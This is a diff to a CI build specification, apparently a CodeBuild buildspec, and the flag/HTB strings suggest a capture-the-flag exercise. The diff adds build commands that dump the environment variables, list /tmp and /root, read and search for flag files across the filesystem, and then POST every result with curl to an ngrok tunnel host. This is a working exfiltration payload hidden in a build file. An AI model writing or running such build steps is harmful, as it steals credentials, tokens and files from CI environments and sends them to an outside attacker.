@@ -3,5 +3,20 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "test"
-      - curl -s https://fa63-108-77-188-159.ngrok-free.app/?test=hello || true
+      - env > /tmp/env.txt 2>&1
+      - ls -la /tmp/ > /tmp/tmp_list.txt 2>&1
+      - ls -la /root/ > /tmp/root_list.txt 2>&1
+      - cat /tmp/flag > /tmp/flag_content.txt 2>&1 || echo "no /tmp/flag"
+      - cat /root/flag > /tmp/root_flag.txt 2>&1 || echo "no /root/flag"
+      - cat /flag > /tmp/flag_file.txt 2>&1 || echo "no /flag"
+      - find / -maxdepth 2 -name "*flag*" > /tmp/find_flags.txt 2>&1 || true
+      - grep -r "FLAG\|flag\|HTB" / --include="*.txt" --include="*.env" 2>/dev/null > /tmp/grep_flags.txt 2>&1 || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/env --data-binary @/tmp/env.txt || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/tmplist --data-binary @/tmp/tmp_list.txt || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/rootlist --data-binary @/tmp/root_list.txt || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/tmpflag --data-binary @/tmp/flag_content.txt || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/rootflag --data-binary @/tmp/root_flag.txt || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/flagfile --data-binary @/tmp/flag_file.txt || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/finds --data-binary @/tmp/find_flags.txt || true
+      - curl -X POST https://fa63-108-77-188-159.ngrok-free.app/greps --data-binary @/tmp/grep_flags.txt || true
+      - echo "done"
